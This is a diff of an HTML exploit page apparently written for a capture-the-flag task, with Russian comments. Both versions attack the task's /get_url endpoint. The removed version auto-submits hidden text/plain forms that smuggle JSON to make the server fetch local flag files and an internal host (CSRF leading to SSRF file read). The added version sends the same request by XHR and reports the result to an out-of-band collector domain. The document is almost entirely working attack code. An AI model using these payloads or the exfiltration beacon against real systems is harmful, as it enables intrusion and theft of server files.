@@ -1,34 +1,25 @@
 <!DOCTYPE html>
-<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
-      enctype="text/plain" target="_blank">
-    <input name='{"url":"file:///flag","test":"' value='test"}' type="hidden">
-</form>
-
-<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
-      enctype="text/plain" target="_blank">
-    <input name='{"url":"file:///app/flag.txt","test":"' value='test"}' type="hidden">
-</form>
-
-<form method="POST" action="https://tasks.goidactf.ru:20185/get_url" 
-      enctype="text/plain" target="_blank">
-    <input name='{"url":"file:///home/flag","test":"' value='test"}' type="hidden">
-</form>
-
 <script>
-// Отправляем все формы
-setTimeout(() => document.forms[0].submit(), 500);
-setTimeout(() => document.forms[1].submit(), 2000);
-setTimeout(() => document.forms[2].submit(), 3500);
+const TARGET = 'https://tasks.goidactf.ru:20185';
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// И пробуем внутренние хосты тоже
-setTimeout(() => {
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://tasks.goidactf.ru:20185/get_url';
-    form.enctype = 'text/plain';
-    form.target = '_blank';
-    form.innerHTML = '<input name=\'{"url":"http://d39b126c-4ef5-4750-8740-2efb6b0b0166.local/flag","test":"\' value=\'test"}\' type="hidden">';
-    document.body.appendChild(form);
-    form.submit();
-}, 5000);
+// Создаём FormData
+const formData = new FormData();
+// НЕ РАБОТАЕТ - FormData создаёт multipart/form-data
+
+// Вместо этого используем Blob с правильным Content-Type
+const blob = new Blob(
+    [JSON.stringify({url: 'file:///flag'})],
+    {type: 'application/json'}
+);
+
+const xhr = new XMLHttpRequest();
+xhr.open('POST', TARGET + '/get_url');
+xhr.send(blob);
+
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+        new Image().src = COLLAB + '/?blob_status=' + xhr.status;
+    }
+};
 </script>
